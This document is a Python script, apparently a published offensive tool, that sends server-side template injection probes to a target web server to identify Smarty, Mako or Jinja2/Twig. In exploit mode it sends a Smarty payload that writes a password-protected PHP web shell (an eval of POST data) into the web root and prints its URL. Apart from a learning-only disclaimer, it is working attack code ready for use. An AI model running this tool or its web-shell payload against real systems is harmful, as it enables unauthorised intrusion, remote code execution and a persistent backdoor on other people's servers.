#!/usr/bin/python3
# @Мартин.
import sys,argparse,textwrap,requests,re
from loguru import logger
Version = "@Мартин. SSTI Detection and utilization tools V1.0.0"
Title='''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo=f'''                                                                                                 
`7MMM.     ,MMF' .M"""bgd  .M"""bgd MMP""MM""YMM `7MMF'
  MMMb    dPMM  ,MI    "Y ,MI    "Y P'   MM   `7   MM  
  M YM   ,M MM  `MMb.     `MMb.          MM        MM  
  M  Mb  M' MM    `YMMNq.   `YMMNq.      MM        MM  
  M  YM.P'  MM  .     `MM .     `MM      MM        MM  
  M  `YM'   MM  Mb     dM Mb     dM      MM        MM  
.JML. `'  .JMML.P"Ybmmd"  P"Ybmmd"     .JMML.    .JMML.                                   
Github==>https://github.com/MartinxMax    
{Version}  
'''


class Processing_messages:
    def __init__(self):
        self.__Header = dict()
        self.log=False


    def __Init_Loger(self):
        logger.remove()
        logger.add(
            sink=sys.stdout,
            format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
            level="INFO"
        )


    def Main(self,protocol,note,tag='',payload=''):
        try:
            note=note.replace(tag,payload)
            method = re.findall(r'(.*?) /', note)[0].lower()
            host = re.findall(r'Host:(.*?)\n', note)[0].strip()
            dir = re.findall(r' (/.*?) ', note)[0]
            body = note.split('\n\n')[-1]
            note = note.split('\n')
        except:
            if self.log:
                self.__Init_Loger()
                logger.error("The message has errors or the format is correct!")
            else:
                print("The message has errors or the format is correct!")
            return (None,None,None,None)
        else:
            for item in note:
                if ':' in item and 'host' not in item.lower():
                    self.__Header[item.split(':')[0].strip()] = item.split(':')[1].strip()
            url = protocol + '://' + host + dir
            try:
                if 'get' in method:
                    respon = requests.get(url, headers=self.__Header,timeout=5)
                elif 'post' in method:
                    respon = requests.post(url, headers=self.__Header, data=body,timeout=5)
                elif 'put' in method:
                    respon = requests.put(url, headers=self.__Header, data=body, timeout=5)
                elif 'head' in method:
                    respon = requests.head(url, headers=self.__Header, data=body, timeout=5)
                elif 'delete' in method:
                    respon = requests.delete(url, headers=self.__Header, data=body, timeout=5)
                elif 'options' in method:
                    respon = requests.options(url, headers=self.__Header, data=body, timeout=5)
                else:
                    respon = None
            except:
                if self.log:
                    logger.error("Network error Or the message you provided may have an error!")
                else:
                    print("Network error Or the message you provided may have an error!")
                return (None,None,None,None)
            else:
                return (url.replace(dir,''),respon.status_code,respon.text,respon.headers)


class Main_Class():
    def __init__(self,args):
        self.PROTOCOL = args.PROTOCOL
        self.TAG = args.TAG
        self.EXP = args.EXP
        self.__PAYLOAD= ['${7*7}','4{*comment*}9','*{"".join("49")}','{{7*7}}','{{7*\'7*\'}}']
        self.__PAYLOAD2=["{if file_put_contents('/var/www/html/Whoami.php','<?php eval($_POST[Martin]);')}{/if}"]
        self.__Processing_messages = Processing_messages()
        self.__Processing_messages.log=True
        self.__Init_Loger()


    def __Init_Loger(self):
        logger.remove()
        logger.add(
            sink=sys.stdout,
            format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
            level="INFO"
        )


    def __Get_Inject_Ploint(self,protocol,tag,payload):
        try:
            with open('./Request.conf','r')as f:
                message = f.read()
        except:
            open('./Request.conf','w')
            logger.error("Request. conf file Created successfully")
        else:
            return self.__Processing_messages.Main(protocol,message,tag,payload)


    def Main_Run(self):
        if not self.EXP:
            if self.__Verification_vulnerability():
                choice = input("Attempt to obtain webshell?(y/n)")
                if 'y' in choice.lower():
                    self.EXP = True
        if self.EXP:
            url,stat,_,_ = self.__Get_Inject_Ploint(self.PROTOCOL,self.TAG,self.__PAYLOAD2[0])
            logger.warning("URL:"+url+"/Whoami.php "+"[Password]:Martin")
        logger.info("[EXIT...]")


    def __Verification_vulnerability(self):
        flag = ""
        for payload in self.__PAYLOAD:
            _,_,result,_ = self.__Get_Inject_Ploint(self.PROTOCOL,self.TAG,payload)
            if '49' in str(result):
                flag += "1"
            elif result == None:
                return False
            else:
                flag += "0"
        flag=int(flag)
        if 11000 <= flag <= 11011:
            logger.warning("The SSTI template used by the other party:Smarty")
            return 0
        elif 10100 <= flag <= 10111:
            logger.warning("The SSTI template used by the other party:Mako")
            return 1
        elif flag == 1:
            logger.warning("The SSTI template used by the other party:jinja2 Or Twig")
            return 2
        else:
            logger.warning("The other party does not have an SSTI vulnerability!")
            return False


def main():
    print(Logo,Title)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Basic usage:
            python3 {MSSTI} -ptl [http or https] # default http
            python3 {MSSTI} -tag [Martin] # Verification vulnerability
            python3 {MSSTI} -exp -tag [Martin] # Conduct an attack  
            '''.format(MSSTI = sys.argv[0]
                )))
    parser.add_argument('-ptl', '--PROTOCOL',default="http", help='Target_Server_Protocol')
    parser.add_argument('-exp', '--EXP', action='store_true', help='Exploit')
    parser.add_argument('-tag', '--TAG', default='', help='Replace_Tag')
    args = parser.parse_args()
    Main_Class(args).Main_Run()


if __name__ == '__main__':
    main()